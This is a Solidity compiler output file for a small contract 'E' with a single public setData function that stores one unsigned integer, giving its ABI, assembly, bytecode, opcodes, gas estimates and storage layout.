{
	"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC": {
		"E": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "a",
							"type": "uint256"
						}
					],
					"name": "setData",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3684:3885  contract E is C {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5b4b73a9\n      eq\n      tag_3\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_5\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_5:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_6\n      jump\t// in\n    tag_4:\n      stop\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3195:3196  a */\n      dup1\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3188:3192  data */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3188:3196  data = a */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3154:3199  function setData(uint a) public { data = a; } */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206f01b955fa7570c8c07b6b1d1793ef917228618d51d525f46a86a7d52fe57bbd64736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600f57600080fd5b5060988061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80635b4b73a914602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b806000819055505056fea26469706673582212206f01b955fa7570c8c07b6b1d1793ef917228618d51d525f46a86a7d52fe57bbd64736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x98 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5B4B73A9 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x1B955FA7570C8C07B6B1D1793EF9172 0x28 PUSH2 0x8D51 0xD5 0x25 DELEGATECALL PUSH11 0x86A7D52FE57BBD64736F6C PUSH4 0x43000606 STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "30400",
						"executionCost": "81",
						"totalCost": "30481"
					},
					"external": {
						"setData(uint256)": "20220"
					}
				},
				"methodIdentifiers": {
					"setData(uint256)": "5b4b73a9"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 1764,
						"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:E",
						"label": "data",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}